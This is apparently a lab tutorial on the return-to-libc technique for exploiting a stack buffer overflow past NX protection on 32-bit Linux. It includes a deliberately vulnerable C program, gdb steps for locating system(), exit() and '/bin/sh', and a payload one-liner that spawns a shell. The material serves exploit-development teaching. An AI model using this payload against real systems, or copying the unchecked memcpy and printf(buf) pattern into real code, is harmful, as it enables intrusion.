# Return-to-libc

The purpose of this lab is to famialiarize with a ret-to-libc technique which is used to exploit buffer overflow vulnerabilities on systems where stack memory is protected with `no execute` \(NX\) bit.

## Overview

{% hint style="info" %}
The ret-to-libc technique is applicable to \*nix systems.
{% endhint %}

In standard stack-based buffer overflow, an attacker can write their shellcode into the vulnerable program's stack and execute it from there. 

If the vulnerable program's stack is protected \(NX bit is set\), the attacker can no longer execute their shellcode from the vulnerable program's stack. Ret-to-libc technique allows the attacker to bypass the NX bit protection and subvert the vulnerable program by re-using existing executable code from the standard C library shared object \(/lib/i386-linux-gnu/libc-\*.so\), that is loaded into the vulnerable program's virtual memory space.

At a high level, ret-to-libc technique is similar to a regular stack overflow, with one key difference - instead of overwritting the return address with address of the shellcode when exploiting a regular stack overflow with no stack protection, in ret-to-libc case, the return address is overwritten with a memory address that points to the function `system(const char *command)` that lives in the `libc`, so that when the overflowed program wants to return, it jumps to the `system()` function and executes the shell command that was passed to the function as `*command` argument. In our case, we want the vulnerable program to spawn a shell, so we will make it call `system("/bin/sh")`.

### Diagram

Below is a simplified diagram of the ret-to-libc exploitation process that we will go through in this lab:

![High level overview of ret-to-libc technique for a 32-bit vulnerable program](../../../.gitbook/assets/image%20%28834%29.png)

Points to note in the overflowed buffer:

1. EIP is overwritten with address of the `system()` function located inside `libc`;
2. Right after the address of `system()`, there's address of the function `exit()`, so that once `system()` `returns`, the vulnerable program can gracefully exit by jumping to the `exit()`;
3. Right after the address of `exit()`, there's a pointer to a memory location that contains the string `/bin/sh` which we want the `system()` to execute.

### Stack Layout

From the above diagram \(after overflow\), if you are wondering why, when looking from top to bottom, the stack's contents are:

1. Address of the `/bin/sh` string
2. Address of the `exit()` function
3. Address of the `system()` function

...we need to remember what happens with the stack when a function is called:

1. Function arguments are pushed on to the stack in reverse order, meaning the left-most argument will be pushed last;
2. Return address, telling the program where to return after the function completes, is pushed;
3. EBP is pushed;
4. Local variables are pushed.

With the above, it should now be clear why the overflowed stack looks that way - essentially, we manually built a stack frame for the `system()` function and pushed its argument - address that contains a string `/bin/sh` and a return address, which the vulnerable program should jump to once the `system()` call completes, which in our case is the address of the function `exit()`.

## Vulnerable Program

The below is our vulnerable program for this lab, which takes user input as a commandline argument and copies it to a memory location inside the program, without checking if the user supplied buffer is bigger than the allocated memory:

{% code title="vulnerable.c" %}
```cpp
#include <stdio.h>

int main(int argc, char *argv[])
{
    char buf[8];
    memcpy(buf, argv[1], strlen(argv[1]));
    printf(buf);
}
```
{% endcode %}

Let's compile it:

```csharp
cc vulnerable.c -mpreferred-stack-boundary=2 -o vulnerable
```

![Vulnerable program compiled](../../../.gitbook/assets/image%20%28836%29.png)

Let's execute it via gdb \(1\), set a breakpoint on the function `main` \(2\) and continue the execution \(3\):

```text
gdb vulnerable anything
b main
r
```

![Spawn vulnerable program with gdb, getting our hands dirty](../../../.gitbook/assets/image%20%28849%29.png)

Additionally, we can confirm our binary has various protections enabled for it with the key one for this lab being the NX:

```text
checksec
```

![Protections overview for the vulnerable program](../../../.gitbook/assets/image%20%28837%29.png)

## Finding system\(\)

By doing:

```csharp
p system
```

We can see, that the function `system` resides at memory location `0xb7e13870` inside the vulnerable program in the `libc` library:

![system\(\) is located at 0xb7e13870](../../../.gitbook/assets/image%20%28839%29.png)

## Finding exit\(\)

The same way, we can find that exit resides at `0xb7e06c30`:

![exit\(\) is located at 0xb7e06c30](../../../.gitbook/assets/image%20%28847%29.png)

## Finding /bin/sh

We want the vulnerable program to call `system("bin/bash")` and spawn a shell for us. 

We need to remember that `system` function is declared as `system(const char *command)`, meaning if we want to invoke it, we need to pass it a memory address that contains the string that we want it to execute \(which in our case is the `/bin/bash`\). We need to find a memory location inside the vulnerable program that points to `/bin/bash` and luckily, it's known that the `libc` contains that string, so let's find it.

Let's see the memory layout of the vulnerable program and look for the start address of the where the `libc` is loaded to:

```csharp
gdb-peda$ info proc map
```

Below shows that `/lib/i386-linux-gnu/libc-2.27.so` starts at `0xb7dd6000`:

![libc is loaded at 0xb7dd6000](../../../.gitbook/assets/image%20%28852%29.png)

We can now use the `strings` utility to find the offset of string `/bin/sh` relative to the start of the `libc` binary and see that it is at `0x17c968`:

```csharp
strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
```

![/bin/sh is at offset 0x17c968 from the start of libc](../../../.gitbook/assets/image%20%28843%29.png)

...which means, that in our vulnerable program, at address `0xb7f52968` \(0xb7dd6000 + 17c968\), we should see the string `/bin/sh`, so let's test it:

```csharp
x/s 0xb7f52968
```

Below shows that `/bin/sh` indeed lives at `0xb7f52968`:

![/bin/sh inside vulnerable program is located at 0xb7f52968](../../../.gitbook/assets/image%20%28844%29.png)

## Exploiting

Assuming we need to send 16 bytes of garbage to the vulnerable program before we can overwrite its return address, and make it jump to `system()` \(located at `0xb7e13870`, expressed as `\x70\x38\xe1\xb7` due to little-endianness\), which will execute `/bin/sh` that's present in  `0xb7f52968` \(expressed as `\x68\x29\xf5\xb7`\), we can execute the exploit like so:

```c
r `python -c 'print("A"*16 + "\x70\x38\xe1\xb7" + "\x30\x6c\xe0\xb7" + "\x68\x29\xf5\xb7")'`
```

...and observe the `/bin/sh` get executed:

![Vulnerable program spawns a /bin/sh shell](../../../.gitbook/assets/image%20%28842%29.png)

## References

[https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)

[https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf)

